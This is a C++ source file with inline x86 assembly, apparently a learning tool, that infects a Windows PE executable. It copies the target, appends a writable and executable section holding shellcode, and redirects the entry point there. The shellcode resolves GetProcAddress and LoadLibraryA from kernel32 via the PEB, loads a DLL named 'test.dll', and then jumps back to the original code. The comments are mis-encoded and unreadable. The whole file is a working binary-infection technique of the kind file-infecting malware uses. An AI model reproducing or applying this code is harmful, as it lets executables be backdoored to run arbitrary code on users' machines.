#define _CRT_SECURE_NO_WARNINGS
//add_section.cpp
#include "windows.h"
#include "stdio.h"
//�ж��ļ��Ƿ�Ϊ�Ϸ�PE�ļ�
BOOL CheckPe(FILE* pFile)
{
	fseek(pFile, 0, SEEK_SET);
	BOOL	bFlags = FALSE;
	WORD	IsMZ;
	DWORD	IsPE, pNT;
	fread(&IsMZ, sizeof(WORD), 1, pFile);
	if (IsMZ == 0x5A4D)
	{
		fseek(pFile, 0x3c, SEEK_SET);
		fread(&pNT, sizeof(DWORD), 1, pFile);
		fseek(pFile, pNT, SEEK_SET);
		fread(&IsPE, sizeof(DWORD), 1, pFile);
		if (IsPE == 0X00004550)
			bFlags = TRUE;
		else
			bFlags = FALSE;
	}
	else
		bFlags = FALSE;
	fseek(pFile, 0, SEEK_SET);
	return bFlags;
}

//��������������ݺ�Ĵ�С
int alig(int size, unsigned int align)
{
	if (size%align != 0)
		return (size / align + 1)*align;
	else
		return size;
}


int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("\t\tusage:add_section filename\n");
		system("pause"); 
		exit(-1);
	}
	FILE* rwFile;
	if ((rwFile = fopen(argv[1], "rb")) == NULL)//���ļ�ʧ�����˳�
	{
		printf("\t\tOpen file faild\n");
		system("pause"); 
		exit(-1);
	}

	if (!CheckPe(rwFile))
	{
		printf("\t\tinvalid pe......!\n");
		system("pause"); 
		exit(-1);
	}
	//����ԭ�ļ�
	char szNewFile[10] = "_New.exe";
	if (!CopyFile(argv[1], szNewFile, 0)) //�������ļ��������˳�
	{
		printf("\t\tbak faild\n");
		system("pause");
		exit(-1);
	}
	IMAGE_NT_HEADERS NThea;
	fseek(rwFile, 0x3c, 0);
	DWORD pNT; //pNT�д��IMAGE_NT_HEADERS�ṹ�ĵ�ַ
	fread(&pNT, sizeof(DWORD), 1, rwFile);
	fseek(rwFile, pNT, 0);
	fread(&NThea, sizeof(IMAGE_NT_HEADERS), 1, rwFile); //��ȡԭ�ļ���IMAGE_NT_HEADERS�ṹ
														//����ԭ�ļ�����������OEP
	int nOldSectionNo = NThea.FileHeader.NumberOfSections;
	int OEP = NThea.OptionalHeader.AddressOfEntryPoint;
	//�����ļ�����ֵ���������ֵ
	int SECTION_ALIG = NThea.OptionalHeader.SectionAlignment;
	int FILE_ALIG = NThea.OptionalHeader.FileAlignment;

	//����Ҫ��ӵ�����
	IMAGE_SECTION_HEADER	NewSection;
	//���ýṹȫ������
	memset(&NewSection, 0, sizeof(IMAGE_SECTION_HEADER));
	//�ٶ���һ�����飬�����ԭ�ļ����һ���������Ϣ
	IMAGE_SECTION_HEADER SEChea;
	//��ԭ�ļ����һ���������Ϣ
	fseek(rwFile, pNT + 248, 0);
	for (int i = 0; i<nOldSectionNo; i++)
		fread(&SEChea, sizeof(IMAGE_SECTION_HEADER), 1, rwFile);

	FILE *newfile = fopen(szNewFile, "rb+");
	if (newfile == NULL)
	{
		printf("\t\tOpen bak file faild\n");
		system("pause"); 
		exit(-1);
	}
	fseek(newfile, SEChea.PointerToRawData + SEChea.SizeOfRawData, SEEK_SET);
	goto shellend;
	__asm
	{
	shell:	PUSHAD
			MOV	EAX, DWORD PTR FS : [30H]; FS:[30H]ָ��PEB
			MOV	EAX, DWORD PTR[EAX + 0CH]; ��ȡPEB_LDR_DATA�ṹ��ָ��
			MOV	EAX, DWORD PTR[EAX + 1CH]; ��ȡLDR_MODULE������׽���inInitializeOrderModuleList��Ա��ָ��
			MOV	EAX, DWORD PTR[EAX]; LDR_MODULE����ڶ�������inInitializeOrderModuleList��Ա��ָ��
			MOV	EAX, DWORD PTR[EAX + 08H]; inInitializeOrderModuleListƫ��8h��õ�Kernel32.dll��ģ���ַ
			MOV	EBP, EAX;	��Kernel32.dllģ���ַ��ַ����kernel��
			MOV	EAX, DWORD PTR[EAX + 3CH]; ָ��IMAGE_NT_HEADERS
			MOV	EAX, DWORD PTR[EBP + EAX + 120]; ָ�򵼳���
			MOV	ECX, [EBP + EAX + 24]; ȡ�������е����������ֵ���Ŀ
			MOV	EBX, [EBP + EAX + 32]; ȡ�����������ֱ�ĵ�ַ
			ADD	EBX, EBP
			PUSH WORD  PTR 0X00; ����GetProcAddress�ַ���
			PUSH DWORD PTR 0X73736572
			PUSH DWORD PTR 0X64644163
			PUSH DWORD PTR 0X6F725074
			PUSH WORD PTR 0X6547
			MOV  EDX, ESP
			PUSH ECX


			F1 :
			MOV	EDI, EDX
				POP	ECX
				DEC	ECX
				TEST	ECX, ECX
				JZ	EXIT
				MOV	ESI, [EBX + ECX * 4]
				ADD	ESI, EBP
				PUSH	ECX
				MOV	ECX, 15
				REPZ	CMPSB
				TEST	ECX, ECX
				JNZ	F1

				POP	ECX
				MOV	ESI, [EBP + EAX + 36]; ȡ�õ���������ű�ĵ�ַ
				ADD	ESI, EBP
				MOVZX	ESI, WORD PTR[ESI + ECX * 2]; ȡ�ý��뺯����ַ������
				MOV	EDI, [EBP + EAX + 28]; ȡ�ú�����ַ��ĵ�ַ
				ADD	EDI, EBP
				MOV	EDI, [EDI + ESI * 4]; ȡ��GetProcAddress�����ĵ�ַ
				ADD	EDI, EBP

				PUSH WORD PTR 0X00; ����LoadLibraryA�ַ���
				PUSH DWORD PTR 0X41797261
				PUSH DWORD PTR 0X7262694C
				PUSH DWORD PTR 0X64616F4C
				PUSH ESP
				PUSH	EBP
				CALL	EDI; ����GetProcAddressȡ��LoadLibraryA�����ĵ�ַ
				PUSH	WORD PTR 0X00; ����test���������������ں��EXE�Ƿ�����������test.dll
				PUSH	DWORD PTR 0X74736574
				PUSH	ESP
				CALL	EAX
				EXIT : ADD ESP, 36; ƽ���ջ
				POPAD
	}
shellend:
	char *pShell;
	int nShellLen;
	__asm
	{
		LEA EAX, shell
		MOV pShell, EAX;
		LEA EBX, shellend
			SUB EBX, EAX
			MOV nShellLen, EBX
	}

	//д��SHELLCODE,
	for (int i = 0; i<nShellLen; i++)
		fputc(pShell[i], newfile);
	//SHELLCODE֮������ת��ԭOEP��ָ��
	NewSection.VirtualAddress = SEChea.VirtualAddress + alig(SEChea.Misc.VirtualSize, SECTION_ALIG);
	BYTE jmp = 0xE9;
	OEP = OEP - (NewSection.VirtualAddress + nShellLen) - 5;
	fwrite(&jmp, sizeof(jmp), 1, newfile);
	fwrite(&OEP, sizeof(OEP), 1, newfile);
	//��������ӵ�������0��������ļ��ж���Ĵ�С
	for (int i = 0; i < alig(nShellLen, FILE_ALIG) - nShellLen - 5; i++) {
		fputc('\0', newfile);
	}
	//�������е�����
	strcpy((char*)NewSection.Name, ".llydd");
	NewSection.PointerToRawData = SEChea.PointerToRawData + SEChea.SizeOfRawData;
	NewSection.Misc.VirtualSize = nShellLen;
	NewSection.SizeOfRawData = alig(nShellLen, FILE_ALIG);
	NewSection.Characteristics = 0xE0000020;//������ɶ���д��ִ��
	fseek(newfile, pNT + 248 + sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo, 0);

	//д���µĿ��
	fwrite(&NewSection, sizeof(IMAGE_SECTION_HEADER), 1, newfile);

	int nNewImageSize = NThea.OptionalHeader.SizeOfImage + alig(nShellLen, SECTION_ALIG);
	int nNewSizeofCode = NThea.OptionalHeader.SizeOfCode + alig(nShellLen, FILE_ALIG);
	fseek(newfile, pNT, 0);
	NThea.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	NThea.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	NThea.OptionalHeader.SizeOfCode = nNewSizeofCode;
	NThea.OptionalHeader.SizeOfImage = nNewImageSize;
	NThea.FileHeader.NumberOfSections = nOldSectionNo + 1;
	NThea.OptionalHeader.AddressOfEntryPoint = NewSection.VirtualAddress;
	//д����º��PEͷ�ṹ
	fwrite(&NThea, sizeof(IMAGE_NT_HEADERS), 1, newfile);
	printf("\t\tok.........!\n");

	fclose(newfile);
	fclose(rwFile);

	system("pause");
	return 1;

}